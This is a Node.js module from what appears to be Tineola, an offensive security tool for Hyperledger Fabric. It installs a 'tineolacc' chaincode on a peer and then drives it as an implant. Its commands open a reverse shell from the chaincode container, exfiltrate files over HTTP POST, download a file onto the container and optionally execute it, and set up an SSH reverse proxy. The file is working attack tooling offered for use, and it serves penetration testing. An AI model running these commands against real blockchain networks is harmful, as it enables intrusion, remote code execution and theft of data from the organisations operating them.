/*
* Copyright 2018-present, Synopsys, Inc.
* All rights reserved.
*
* This source code is licensed under the MIT license found in the
* LICENSE file in the root directory of this source tree.
*
*/

const http = require('http');
const fs = require('fs');
const url = require('url');
const fabric = require('../fabric');
const {handleErrors, extractErrorResponse} = require('../utils');
let vorpal = null;
let fabricHelper = require('../fabric-helper');

const TINEOLACC_NAME = 'tineolacc';

async function checkTineolaInstall(version) {
  let resp = await fabric.client.queryInstalledChaincodes(fabric.peer);
  if (resp && resp.chaincodes) {
    for(let i=0; i < resp.chaincodes.length; i++) {
      if (resp.chaincodes[i].name === TINEOLACC_NAME && resp.chaincodes[i].version === version) {
        return true;
      }
    }
  }
  return false;
}

async function checkTineolaInit(version) {
  let resp = await fabric.channel.queryInstantiatedChaincodes(fabric.peer, true);
  if (resp && resp.chaincodes) {
    for(let i=0; i < resp.chaincodes.length; i++) {
      if (resp.chaincodes[i].name === TINEOLACC_NAME && resp.chaincodes[i].version === version) {
        return 'installed';
      }
      if (resp.chaincodes[i].name === TINEOLACC_NAME) {
        return 'upgrade';
      }
    }
  }
  return 'missing';
}

async function testTineola() {
  // Test Chaincode
  vorpal.log('Testing tineola installation');
  const testValue = await fabricHelper.queryCC(TINEOLACC_NAME, 'getValue', ['test']);
  if (testValue === '12345') {
    vorpal.log('Test case passed');
  } else {
    vorpal.log('Test case failed');
  }
}

async function installTineola(version) {
  if (!version) {
    version = 'v1';
  }
  vorpal.log(`Installing ${TINEOLACC_NAME} at version ${version}`);

  // Install to peer
  if (await checkTineolaInstall(version)) {
    vorpal.log('Tineola found on peer');
  } else {
    vorpal.log('Installing chaincode on peer');
    await fabricHelper.installCC(TINEOLACC_NAME, version, TINEOLACC_NAME);
  }

  // Initialize on channel
  const status = await checkTineolaInit(version);
  if (status === 'installed') {
    vorpal.log('Tineola already initialized on channel');
  } else {
    vorpal.log('Initializing chaincode to channel');
    await fabricHelper.initCC(TINEOLACC_NAME, version, ['test', '12345'], status === 'upgrade');
  }

  // Test the chaincode
  vorpal.log('Waiting 5s before sending test');
  await new Promise(resolve => setTimeout(resolve, 5000));
  await testTineola();
}

async function tineolaShell(dest) {
  const response = await fabricHelper.queryCC(TINEOLACC_NAME, 'shell', [dest]);
  vorpal.log(`CC Response: ${response}`);
}

async function tineolaHttpDrop(url, path, exec) {
  const response = await fabricHelper.queryCC(TINEOLACC_NAME, 'httpDrop', [url, path, exec ? 'true' : 'false']);
  vorpal.log(`CC Response: ${response}`);
}

async function tineolaHttpExfil(url, path) {
  const response = await fabricHelper.queryCC(TINEOLACC_NAME, 'httpExfil', [url, path]);
  vorpal.log(`CC Response: ${response}`);
}

async function tineolaSshProxy(args, self) {
  const localPort = args.options.localPort ? args.options.localPort : '3333';
  const sshPort = args.options.callbackSshPort ? args.options.callbackSshPort : '22';
  let result = await self.prompt({
    type: 'confirm',
    name: 'sshConfirm',
    default: 'yes',
    message: `Is the SSH service running on port ${sshPort}?`
  });
  if (! result.sshConfirm) {
    vorpal.log('Tineola Proxy requires SSH running on the user\'s machine for reverse connection');
    return;
  }
  const sshPrivKey = fs.readFileSync(args.callbackSshKeyFile).toString();
  const arguments = [
    `${localPort}:${args.destination}`,
    `${args.callbackSshUser}@${args.callbackIp}`,
    sshPrivKey
    //`${sshPort}`
  ];
  const response = await fabricHelper.queryCC(TINEOLACC_NAME, 'ssh', arguments);
  vorpal.log(`CC Response: ${response}`);
}

async function tineolaHttpProxy(localPort, debug) {
  const server = http.createServer((req, res) => {
    const urlParsed = url.parse(req.url);
    const pathParts = urlParsed.path.split("/");
    const ccName = pathParts.length > 1 ? pathParts[1] : null;
    const funcName = pathParts.length > 2 ? pathParts[2] : null;
    const isInvoke = req.headers['hlf-invoke'] === 'yes';
    let body = [];
    req.on('data', (chunk) => {
      body.push(chunk);
    }).on('end', () => {
      try {
        if (!ccName || !funcName) {
          throw new Error("Request must be in the form /ccName/funcName");
        }
        body = Buffer.concat(body).toString();
        const arguments = fabricHelper.parseArgumentsList(body);
        if (debug) {
          vorpal.log(`Sending fabric request ${ccName}.${funcName}(${arguments})`);
        }
        queryFn = isInvoke ? fabricHelper.invokeCC : fabricHelper.queryCC;
        queryFn(ccName, funcName, arguments).then((response) => {
          res.writeHead(200, {'Content-Type': 'text/plain'});
          res.write(response);
          res.end();
        }).catch((err) => {
          res.writeHead(500, {'Content-Type': 'text/plain'});
          res.write(extractErrorResponse(err));
          res.end();
        });
      } catch(err) {
        res.writeHead(500, {'Content-Type': 'text/plain'});
        res.write(err.toString());
        res.end();
      }
    });
  });

  server.on('clientError', (err, socket) => {
    socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
  });

  localPort = localPort ? localPort : 8888;
  server.listen(localPort, () =>{
    vorpal.log(`Local server listening on port ${localPort}`);
    vorpal.log(`Send requests like:
POST /ccName/funcName HTTP/1.1
HLF-Invoke: no

["arguments","as", "json"]`);
  });
}

module.exports = (_vorpal) => {
  vorpal = _vorpal;
  fabricHelper = fabricHelper(vorpal, fabric);

  vorpal
    .command('tineola-install', 'Install tineola to on a peer. Requires peer, orderer, and channel to be set.')
    .option('--version <version>', 'Set a version string (default: v1).')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.orderer) {
        return 'Must connect to orderer with orderer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
    })
    .action( (args, cb) => {
      return handleErrors(installTineola(args.options.version), vorpal, cb);
    });

  vorpal
    .command('tineola-test', 'Test existing tineola installation')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
    })
    .action( (args, cb) => {
      return handleErrors(testTineola(), vorpal, cb);
    });

  vorpal
    .command('tineola-http-proxy', 'Start local http proxy for passing data to chaincode')
    .option('-p,--port <localPort>', 'Listen on a specific local port (default: 8888)')
    .option('-d,--debug', 'Run in debug mode with a request log')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
    })
    .action( (args, cb) => {
      return handleErrors(tineolaHttpProxy(args.options.port, args.options.debug), vorpal, cb);
    });

  vorpal
    .command('tineola-shell <destination>', 'Start a reverse shell to chaincode container, destination should be formatted ip:port (requires tineola to be installed on peer)')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
      if(! /^\d+\.\d+\.\d+\.\d+:\d+$/.test(args.destination)) {
        return 'Destination must be in the ip:port format';
      }
    })
    .action( (args, cb) => {
      return handleErrors(tineolaShell(args.destination), vorpal, cb);
    });

  vorpal
    .command('tineola-http-exfil <url> <path>', 'Exfiltrate a file from the remote system using HTTP POST (requires tineola to be installed on peer)')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
    })
    .action( (args, cb) => {
      return handleErrors(tineolaHttpExfil(args.url, args.path), vorpal, cb);
    });

  vorpal
    .command('tineola-http-drop <url> <path>', 'Drop a file from an HTTP URL to the desired file system path on the chaincode container (requires tineola to be installed on peer)')
    .option('--exec', 'Execute the downloaded file')
    .validate( (args) =>{
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
    })
    .action( (args, cb) => {
      return handleErrors(tineolaHttpDrop(args.url, args.path, args.options.exec === 'true'), vorpal, cb);
    });

  vorpal
    .command('tineola-ssh-proxy <destination> <callbackIp> <callbackSshUser> <callbackSshKeyFile>', 'SSH reverse proxy through chaincode container (requires tineola to be installed on peer)')
    .option('--local-port <localPort>', 'Local port to open for proxy (default: 3333)')
    //.option('--ssh-port <callbackSshPort>', 'SSH Port (default: 22')
    .validate( (args) => {
      if (!fabric.peer) {
        return 'Must connect to peer with peer-set';
      }
      if (!fabric.channel) {
        return 'Must choose a channel with channel-set';
      }
      if(! /^\d+\.\d+\.\d+\.\d+:\d+$/.test(args.destination)) {
        return 'Destination must be in the ip:port format';
      }
      if(! /^\d+\.\d+\.\d+\.\d+$/.test(args.callbackIp)) {
        return 'Callback IP must be an IP address';
      }
      if (!fs.existsSync(args.callbackSshKeyFile)) {
        return 'SSH Keyfile must exist';
      }
    })
    .action( function (args, cb) {
      return handleErrors(tineolaSshProxy(args, this), vorpal, cb);
    });
};
